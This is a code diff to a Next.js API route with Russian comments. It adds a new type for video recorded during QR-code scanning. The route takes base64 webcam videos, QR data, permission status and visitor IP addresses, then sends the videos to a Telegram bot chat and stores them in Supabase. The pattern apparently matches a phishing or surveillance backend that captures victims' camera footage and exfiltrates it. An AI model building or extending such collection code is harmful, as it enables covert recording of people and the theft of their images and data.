@@ -10,6 +10,7 @@ enum MessageType {
   Video1 = "video1",
   Video2 = "video2",
   QrCode = "qr_code",
+  VideoQrScan = "video_qr_scan", // Добавлен новый тип
 }
 
 export async function POST(req: NextRequest) {
@@ -36,6 +37,7 @@ export async function POST(req: NextRequest) {
       video2,
       qrCodeData,
       permissionStatus,
+      videoQrScan, // Новое поле для видео во время QR-сканирования
     } = await req.json();
 
     const ipAddressHeader = req.headers.get("x-forwarded-for");
@@ -156,26 +158,30 @@ export async function POST(req: NextRequest) {
 
       case MessageType.Video1:
       case MessageType.Video2:
-        const videoData = messageType === MessageType.Video1 ? video1 : video2;
+      case MessageType.VideoQrScan: // Добавлен новый тип для обработки
+        const videoData = messageType === MessageType.Video1 ? video1 : (messageType === MessageType.Video2 ? video2 : videoQrScan);
+        const videoTypeLabel = messageType === MessageType.Video1 ? "Видео 1" : (messageType === MessageType.Video2 ? "Видео 2" : "Видео QR-скана");
+        const fileNamePrefix = messageType === MessageType.Video1 ? "video1" : (messageType === MessageType.Video2 ? "video2" : "video_qr_scan");
+
         if (videoData) {
-          console.log(`Attempting to send ${messageType}...`);
+          console.log(`Attempting to send ${videoTypeLabel}...`);
           const base64Data = videoData.replace(/^data:video\/\w+;base64,/, "");
           const buffer = Buffer.from(base64Data, "base64");
-          const fileName = `${messageType}_${sessionId}_attempt${attempt}.webm`;
+          const fileName = `${fileNamePrefix}_${sessionId}_attempt${attempt}.webm`;
           const storagePath = `videos/${sessionId}/${fileName}`;
 
           const formData = new FormData();
           formData.append("chat_id", TELEGRAM_CHAT_ID);
           formData.append("video", new Blob([buffer], { type: "video/webm" }), fileName);
-          formData.append("caption", `${sessionPrefix}🎥 *${messageType === MessageType.Video1 ? "Видео 1" : "Видео 2"}*${attemptSuffix} (Время: ${formattedTimestamp})`);
+          formData.append("caption", `${sessionPrefix}🎥 *${videoTypeLabel}*${attemptSuffix} (Время: ${formattedTimestamp})`);
 
           telegramPromises.push(
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
               method: "POST",
               body: formData,
             }).then(async res => {
-              console.log(`${messageType} API response status:`, res.status);
-              if (!res.ok) { const errorBody = await res.text(); console.error(`${messageType} API error response:`, errorBody); }
+              console.log(`${videoTypeLabel} API response status:`, res.status);
+              if (!res.ok) { const errorBody = await res.text(); console.error(`${videoTypeLabel} API error response:`, errorBody); }
               return res;
             })
           );
@@ -188,9 +194,9 @@ export async function POST(req: NextRequest) {
                 upsert: true, // Overwrite if exists
               }).then(async ({ data: storageData, error: storageError }) => {
                 if (storageError) {
-                  console.error(`Supabase: Error uploading ${messageType} to storage:`, storageError);
+                  console.error(`Supabase: Error uploading ${videoTypeLabel} to storage:`, storageError);
                 } else {
-                  console.log(`Supabase: ${messageType} uploaded to storage successfully.`);
+                  console.log(`Supabase: ${videoTypeLabel} uploaded to storage successfully.`);
                   // Get public URL if needed, or just store the path
                   // const { data: publicUrlData } = supabase.storage.from('videos').getPublicUrl(storagePath);
                   // const publicUrl = publicUrlData?.publicUrl;
@@ -205,9 +211,9 @@ export async function POST(req: NextRequest) {
                       storage_path: storagePath,
                     }).then(({ data, error }) => {
                       if (error) {
-                        console.error(`Supabase: Error saving ${messageType} record to DB:`, error);
+                        console.error(`Supabase: Error saving ${videoTypeLabel} record to DB:`, error);
                       } else {
-                        console.log(`Supabase: ${messageType} record saved to DB successfully.`);
+                        console.log(`Supabase: ${videoTypeLabel} record saved to DB successfully.`);
                       }
                     })
                   );
